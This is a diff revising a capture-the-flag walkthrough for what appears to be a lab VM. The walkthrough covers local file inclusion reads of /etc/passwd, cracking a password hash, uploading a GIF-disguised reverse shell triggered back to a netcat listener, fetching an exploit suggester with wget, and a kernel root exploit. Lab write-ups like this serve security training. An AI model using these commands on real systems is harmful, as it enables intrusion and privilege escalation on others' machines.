@@ -106,7 +106,7 @@ No parameter called file passed to me
 * Note : this API don't use json , so send the file name in raw format
 ```
 
-So i try to send an image to see the response :)
+So i try to send an image with GET and `curl` to see the response.
 
     $ curl -X GET http://192.168.2.180:8011/api/files_api.php?file=universe.jpg
 
@@ -115,10 +115,11 @@ So i try to send an image to see the response :)
   <title>franks website | simple website browser API</title>
 </head>
 
-<b>********* HACKER DETECTED *********</b><p>YOUR IP IS : 192.168.2.236</p><p>WRONG INPUT !!</p>%
+<b>********* HACKER DETECTED *********</b>
+<p>YOUR IP IS : 192.168.2.236</p><p>WRONG INPUT !!</p>%
 ```
 
-Rememder into the result of nmap, the server use POST,OPTIONS,GET,HEAD, try a POST request:
+Rememder into the result of nmap, the server use POST request too:
 
     $ curl -X POST -d file=/etc/passwd http://192.168.2.180:8011/api/files_api.php
 
@@ -155,7 +156,7 @@ And `/development` will serve too soon. Just to be sure, we can look if `$apr1$1
 Possible Hashs:
 [+] MD5(APR)
 ```
-So, we have to crack this hash, we'll use `john`. Create a file name `hash` with user and hash above:
+So, we have to crack this hash, we'll use `johntheripper`. Create a file name `hash` with user and hash above:
 
     $ vim hash
     frank:$apr1$1oIGDEDK$/aVFPluYt56UvslZMBDoC0
@@ -176,7 +177,8 @@ Password acquired (`frank!!!`), Go to the page `/development` to look:
 * Here is my unfinished tools list
 - the uploader tool (finished but need security review)
 ```
-So there are a hidden path somewhere, let's try to find it with dirb, we create a file to logging with dirb: 
+So there are a hidden path somewhere, let's try to find it with dirb, we create a file for `dirb` be able to connect too:
+
     $ vim log
     frank:frank!!!
     :wq
@@ -232,21 +234,19 @@ File is an image - image/gif.The file shell.gif has been uploaded to my uploads 
 
     $ dirb http://192.168.2.180/development/uploader ./probe-url.txt -u $(cat info)
 
+Yes, yes, we can do it manually too :p.
+
 ```txt
 ==> DIRECTORY: http://192.168.2.180/development/uploader/FRANKuploads/
 ```
 
-Well it's a bit of luck here lol. So our `shell.gif` is present, now, we start netcat to listen:
+Well it's a bit of luck here. So our `shell.gif` is present, now, we prepare our listener `netcat`:
 
     $ nc -lnvp 1234
 
-And we activate the shell. The file `passwd` than we found above reveal the path `/var/www` and we have the rest (`/development/uploader/FRANKuploads/`): 
+And we activate the shell. The file `passwd` than we found above has reveal the path `/var/www` and we have the rest (`/development/uploader/FRANKuploads/`): 
 
     $ curl -X POST -d "file=/var/www/development/uploader/FRANKuploads/shell.gif" http://192.168.2.180:8011/api/files_api.php
-
-And we have to execute this shell using the development site in command line.
-
-    $ curl -X POST -d "file=/etc/shadow" http://192.168.2.180:8011/api/files_api.php
 
 ```txt
 connect to [192.168.2.143] from (UNKNOWN) [192.168.2.180] 50186Linux ubuntu 2.6.35-19-generic #28-Ubuntu SMP Sun Aug 29 06:34:38 UTC 2010 x86_64 GNU/Linux
@@ -255,7 +255,7 @@ USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 /bin/sh: can't access tty; job control turned off
 ```
-We change the shell with /bin/bash
+Change the actual shell with `bash`:
 
     $ python -c 'import pty; pty.spawn("/bin/sh")'
 
@@ -271,10 +271,12 @@ Nothing :-( maybe something into user dir...
     $ cat PE.txt
     Try it as fast as you can ;)
 
+Maybe some kernel exploits:
+
     $ uname -a 
     Linux ubuntu 2.6.35-19-generic #28-Ubuntu SMP Sun Aug 29 06:34:38 UTC 2010 x86_64 GNU/Linux
 
-After googling a bit to search how find exploit, i found this [post](https://www.blackmoreops.com/2017/01/17/find-linux-exploits-by-kernel-version/).  Download Linux\_Exploit\_Suggester.pl on your machine: 
+The command `searchsploit` with this kernel found nothing, after googling a bit to search how find exploit, i found this [post](https://www.blackmoreops.com/2017/01/17/find-linux-exploits-by-kernel-version/).  Download Linux\_Exploit\_Suggester.pl on your machine: 
 
     $ wget https://raw.githubusercontent.com/InteliSecureLabs/Linux_Exploit_Suggester/master/Linux_Exploit_Suggester.pl -O les.pl
     $ python2.7 -m SimpleHTTPServer 4444
@@ -290,7 +292,7 @@ On victim:
    CVE-2010-3904
    Source: http://www.exploit-db.com/exploits/15285/
 ```
-If you have install the package `exploitdb` so it's easy:
+If you have install the package `exploitdb`, so it's easy:
 
     $ cp /usr/share/exploitdb/exploits/linux/local/15285.c ./
 
@@ -315,7 +317,6 @@ On victim:
 [*] Restoring function pointer...
 [*] Got root!
 ```
-    
     # cat /root/root.txt
     8f420533b79076cc99e9f95a1a4e5568
 
